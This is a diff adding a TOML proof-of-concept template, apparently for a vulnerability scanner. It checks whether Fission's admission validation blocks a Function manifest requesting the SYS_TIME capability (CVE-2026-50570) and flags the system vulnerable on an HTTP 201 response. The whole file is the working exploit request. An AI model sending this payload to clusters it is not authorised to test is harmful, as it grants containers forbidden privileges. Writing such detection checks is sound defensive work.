@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "通过在 Fission Function 或 Environment CRD 的 securityContext 中请求 CAP_SYS_TIME 能力，验证 Fission 的准入校验是否能够拦截该非授权请求。若请求被接受并创建 Pod，则证明存在漏洞。"
+id = "POC-AVE-2026-0703"
+name = "Fission Incomplete Capability Denylist PoC"
+severity = "high"
+tags = ["ave-2026-0703"]
+vuln_id = [
+    "CVE-2026-50570",
+    "AVE-2026-0703",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/apis/fission.run.io/v1/functions"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{
+  "apiVersion": "fission.run.io/v1",
+  "kind": "Function",
+  "metadata": {
+    "name": "poc-sys-time"
+  },
+  "spec": {
+    "containers": [
+      {
+        "name": "main",
+        "image": "alpine",
+        "securityContext": {
+          "capabilities": {
+            "add": ["SYS_TIME"]
+          }
+        }
+      }
+    ]
+  }
+}
+"""
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
